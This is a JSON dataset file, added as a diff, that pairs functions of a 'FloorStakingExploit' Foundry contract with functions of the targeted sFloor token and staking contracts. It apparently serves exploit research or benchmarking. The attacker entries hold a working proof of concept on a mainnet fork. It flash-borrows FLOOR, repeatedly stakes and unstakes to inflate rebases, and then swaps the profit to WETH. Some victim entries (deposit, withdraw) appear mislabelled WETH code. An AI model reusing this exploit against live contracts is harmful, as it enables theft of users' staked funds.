@@ -1,0 +1,212 @@
+[
+  {
+    "contract/interface": "FloorStakingExploit",
+    "source_type": "attacker_contract",
+    "function_name": "IS_TEST",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "FloorStakingExploit",
+    "source_type": "attacker_contract",
+    "function_name": "excludeArtifacts",
+    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "FloorStakingExploit",
+    "source_type": "attacker_contract",
+    "function_name": "excludeContracts",
+    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "FloorStakingExploit",
+    "source_type": "attacker_contract",
+    "function_name": "excludeSenders",
+    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "FloorStakingExploit",
+    "source_type": "attacker_contract",
+    "function_name": "failed",
+    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "FloorStakingExploit",
+    "source_type": "attacker_contract",
+    "function_name": "setUp",
+    "original_code": "    function setUp() public {\n        vm.createSelectFork(\"https://eth.llamarpc.com\", 18_068_772);\n\n        vm.label(address(floor), \"floor\");\n        vm.label(address(sFloor), \"sFloor\");\n        vm.label(address(gFloor), \"gFloor\");\n        vm.label(address(WETH), \"WETH\");\n        vm.label(address(staking), \"FloorStaking\");\n        vm.label(address(floorUniPool), \"Pool\");\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "FloorStakingExploit",
+    "source_type": "attacker_contract",
+    "function_name": "targetArtifactSelectors",
+    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "FloorStakingExploit",
+    "source_type": "attacker_contract",
+    "function_name": "targetArtifacts",
+    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "FloorStakingExploit",
+    "source_type": "attacker_contract",
+    "function_name": "targetContracts",
+    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "FloorStakingExploit",
+    "source_type": "attacker_contract",
+    "function_name": "targetInterfaces",
+    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "FloorStakingExploit",
+    "source_type": "attacker_contract",
+    "function_name": "targetSelectors",
+    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "FloorStakingExploit",
+    "source_type": "attacker_contract",
+    "function_name": "targetSenders",
+    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "FloorStakingExploit",
+    "source_type": "attacker_contract",
+    "function_name": "testExploit",
+    "original_code": "    function testExploit() public {\n        flashAmount = floor.balanceOf(address(floorUniPool)) - 1;\n        floorUniPool.flash(address(this), 0, flashAmount, \"\");\n\n        uint256 profitAmount = floor.balanceOf(address(this));\n        emit log_named_decimal_uint(\"floor token balance after exploit\", profitAmount, floor.decimals());\n        floorUniPool.swap(\n            address(this), false, int256(profitAmount), uint160(0xfFfd8963EFd1fC6A506488495d951d5263988d25), \"\"\n        );\n        emit log_named_decimal_uint(\"weth balance after swap\", WETH.balanceOf(address(this)), WETH.decimals());\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "FloorStakingExploit",
+    "source_type": "attacker_contract",
+    "function_name": "uniswapV3FlashCallback",
+    "original_code": "    function uniswapV3FlashCallback(uint256, /*fee0*/ uint256 fee1, bytes calldata) external {\n        uint256 i = 0;\n        while (i < 17) {\n            uint256 balanceAttacker = floor.balanceOf(address(this));\n            uint256 balanceStaking = floor.balanceOf(address(staking));\n            uint256 circulatingSupply = sFloor.circulatingSupply();\n            if (balanceAttacker + balanceStaking > circulatingSupply) {\n                floor.approve(address(staking), balanceAttacker);\n                staking.stake(address(this), balanceAttacker, false, true);\n                uint256 gFloorBalance = gFloor.balanceOf(address(this));\n                staking.unstake(address(this), gFloorBalance, true, false);\n                i += 1;\n            }\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "FloorStakingExploit",
+    "source_type": "attacker_contract",
+    "function_name": "uniswapV3SwapCallback",
+    "original_code": "    function uniswapV3SwapCallback(int256 amount0Delta, int256 amount1Delta, bytes calldata data) external {\n        int256 amount = amount1Delta;\n        if (amount <= 0) {\n            amount = 0 - amount;\n        }\n        floor.transfer(msg.sender, uint256(amount));\n    }\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IsFloor",
+    "source_type": "victim_contract",
+    "function_name": "allowance",
+    "original_code": "    function allowance(address owner, address spender) public view virtual override returns (uint256) {\n        return _allowances[owner][spender];\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IsFloor",
+    "source_type": "victim_contract",
+    "function_name": "approve",
+    "original_code": "    function approve(address spender, uint256 amount) public virtual override returns (bool) {\n        _approve(msg.sender, spender, amount);\n        return true;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IsFloor",
+    "source_type": "victim_contract",
+    "function_name": "balanceOf",
+    "original_code": "    function balanceOf(address account) public view virtual override returns (uint256) {\n        return _balances[account];\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IsFloor",
+    "source_type": "victim_contract",
+    "function_name": "circulatingSupply",
+    "original_code": "    function circulatingSupply() public view override returns (uint256) {\n        return\n            _totalSupply.sub(balanceOf(stakingContract)).add(gFLOOR.balanceFrom(IERC20(address(gFLOOR)).totalSupply())).add(\n                IStaking(stakingContract).supplyInWarmup()\n            );\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IsFloor",
+    "source_type": "victim_contract",
+    "function_name": "decimals",
+    "original_code": "    function decimals() public view virtual returns (uint8) {\n        return _decimals;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IsFloor",
+    "source_type": "victim_contract",
+    "function_name": "deposit",
+    "original_code": "    function deposit() public payable {\n        balanceOf[msg.sender] += msg.value;\n        Deposit(msg.sender, msg.value);\n    }\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IsFloor",
+    "source_type": "victim_contract",
+    "function_name": "name",
+    "original_code": "    function name() public view returns (string memory) {\n        return _name;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IsFloor",
+    "source_type": "victim_contract",
+    "function_name": "owner",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "IsFloor",
+    "source_type": "victim_contract",
+    "function_name": "symbol",
+    "original_code": "    function symbol() public view returns (string memory) {\n        return _symbol;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IsFloor",
+    "source_type": "victim_contract",
+    "function_name": "totalSupply",
+    "original_code": "    function totalSupply() public view override returns (uint256) {\n        return _totalSupply;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IsFloor",
+    "source_type": "victim_contract",
+    "function_name": "transfer",
+    "original_code": "    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {\n        _transfer(msg.sender, recipient, amount);\n        return true;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IsFloor",
+    "source_type": "victim_contract",
+    "function_name": "transferFrom",
+    "original_code": "    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {\n        _transfer(sender, recipient, amount);\n        _approve(sender, msg.sender, _allowances[sender][msg.sender].sub(amount, \"ERC20: transfer amount exceeds allowance\"));\n        return true;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IsFloor",
+    "source_type": "victim_contract",
+    "function_name": "withdraw",
+    "original_code": "    function withdraw(uint wad) public {\n        require(balanceOf[msg.sender] >= wad);\n        balanceOf[msg.sender] -= wad;\n        msg.sender.transfer(wad);\n        Withdrawal(msg.sender, wad);\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IFloorStaking",
+    "source_type": "victim_contract",
+    "function_name": "stake",
+    "original_code": "    function stake(\n        address _to,\n        uint256 _amount,\n        bool _rebasing,\n        bool _claim\n    ) external returns (uint256);\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IFloorStaking",
+    "source_type": "victim_contract",
+    "function_name": "unstake",
+    "original_code": "    function unstake(\n        address _to,\n        uint256 _amount,\n        bool _trigger,\n        bool _rebasing\n    ) external returns (uint256);\n\n",
+    "description": ""
+  }
+]
